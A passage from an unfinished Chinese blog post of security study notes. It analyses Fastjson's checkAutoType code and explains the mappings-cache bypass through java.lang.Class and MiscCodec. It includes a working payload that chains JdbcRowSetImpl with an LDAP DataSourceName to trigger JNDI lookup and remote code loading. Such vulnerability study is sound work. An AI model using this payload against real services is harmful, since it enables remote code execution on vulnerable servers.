<span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">                ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">				<span class="comment">// 有期望类的话就得匹配期望类</span></span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>找一下往mappings缓存里放的方法。</p>
+<p>总共就两个方法</p>
+<p><img src="/2026/06/23/fastjson/fastjson41.png"></p>
+<p>这个是把内置类放进缓存表里，我们是无法控制放进去的类的pass掉</p>
+<p><img src="/2026/06/23/fastjson/fastjson42.png"></p>
+<p>只剩这个了，再找一下谁调用了loadClass</p>
+<p><img src="/2026/06/23/fastjson/fastjson43.png"></p>
+<p>也就这个了，MiscCodec就是反序列化器，回忆一下如图</p>
+<p><img src="/2026/06/23/fastjson/fastjson9.png"></p>
+<p>之前流程分析的时候，有一部分就是获取反序列化器，那个时候因为这个Person类是我们自己定义的类没有对应的反序列化器，所以自己创建了一个反序列化器，而这个MiscCodec就是预先在ParserConfig里放好的反序列化器，他可以反序列化Class类，只要这个strVal可控，我们就可以把恶意类预先放到缓存里。</p>
+<p><img src="/2026/06/23/fastjson/fastjson44.png"></p>
+<p>这一部分就是给strVal赋值。</p>
+<p>总结一下</p>
+<p>@type:xxx这部分结束以后必须是val，strVal就是val对应的值部分。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://localhost:10389/cn=test,dc=example,dc=com\&quot;,\&quot;autoCommit\&quot;:\&quot;false\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">JSON.parseObject(s);</span><br></pre></td></tr></table></figure>
+
+<p>还没写完</p>
+<p>推荐视频:<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1bD4y117Qh/?spm_id_from=333.337.search-card.all.click&vd_source=c4cebc18d34b17376b1b2a473da11100">https://www.bilibili.com/video/BV1bD4y117Qh/?spm_id_from=333.337.search-card.all.click&amp;vd_source=c4cebc18d34b17376b1b2a473da11100</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1pP411N726?spm_id_from=333.788.videopod.sections&vd_source=c4cebc18d34b17376b1b2a473da11100">https://www.bilibili.com/video/BV1pP411N726?spm_id_from=333.788.videopod.sections&amp;vd_source=c4cebc18d34b17376b1b2a473da11100</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1bG4y157Ef?spm_id_from=333.788.videopod.sections&vd_source=c4cebc18d34b17376b1b2a473da11100">https://www.bilibili.com/video/BV1bG4y157Ef?spm_id_from=333.788.videopod.sections&amp;vd_source=c4cebc18d34b17376b1b2a473da11100</a></p>
+
+    </div>
+
+    
+    
+    
+<div style="margin-top: 48px; padding-top: 24px; border-top: 1px solid rgba(128,128,128,0.15); text-align: center; color: #999; font-size: 0.88em;">
+  <p>感谢阅读 🙏 如果这篇文章对你有帮助，欢迎分享给更多人。</p>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/06/22/c3p0/" rel="prev" title="C3P0">
+      <i class="fa fa-chevron-left"></i> C3P0
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ctwabc"
+      src="https://github.com/ctwabc.png">
+  <p class="site-author-name" itemprop="name">ctwabc</p>
+  <div class="site-description" itemprop="description">学习笔记</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="sidebar-button motion-element"><i class="fa fa-comment"></i>
+    Chat
+  </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ctwabc" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ctwabc" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+<div class="sidebar-github-link">
+  <a href="https://github.com/ctwabc" target="_blank" rel="noopener">
+    <i class="fab fa-github"></i> Star on GitHub
+  </a>
+</div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ctwabc</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">41k</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div><div class="custom-footer">
+  <span>用代码记录世界，用安全守护代码  ·  <i class="fa fa-coffee"></i>  用心写作</span>
+</div>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+<script>
+(function() {
+  // Wallpaper fallback: if the image fails to load, keep the gradient
+  var bgImg = new Image();
+  bgImg.src = 'https://api.paugram.com/wallpaper/';
+  bgImg.onload = function() {
+    document.body.style.backgroundImage = 'url(https://api.paugram.com/wallpaper/)';
+  };
+
+  // Smooth scroll for anchor links
+  document.querySelectorAll('a[href^="#"]').forEach(function(anchor) {
+    anchor.addEventListener('click', function(e) {
+      var target = document.querySelector(this.getAttribute('href'));
+      if (target) {
+        e.preventDefault();
+        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      }
+    });
+  });
+
+  // Intersection Observer for scroll-triggered fade-in
+  if ('IntersectionObserver' in window) {
+    var observer = new IntersectionObserver(function(entries) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          entry.target.style.opacity = '1';
+          entry.target.style.transform = 'translateY(0)';
+          observer.unobserve(entry.target);
+        }
+      });
+    }, { threshold: 0.1 });
+
+    document.querySelectorAll('.post-block').forEach(function(el) {
+      el.style.opacity = '0';
+      el.style.transform = 'translateY(20px)';
+      el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+      observer.observe(el);
+    });
+  }
+
+})();
+</script>
+
+</body>
+</html>
